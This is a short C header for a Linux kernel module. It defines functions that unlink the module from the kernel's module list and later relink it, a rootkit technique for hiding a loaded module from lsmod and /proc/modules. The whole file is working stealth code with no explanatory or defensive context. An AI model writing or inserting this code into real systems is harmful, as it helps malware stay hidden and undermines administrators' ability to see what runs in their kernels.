#pragma once

#include <linux/module.h>
#include <linux/list.h>

static struct list_head *prev_module = NULL;

static inline void hide_module(void) {
    if (!prev_module) {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
    }
}

static inline void show_module(void) {
    if (prev_module) {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
    }
}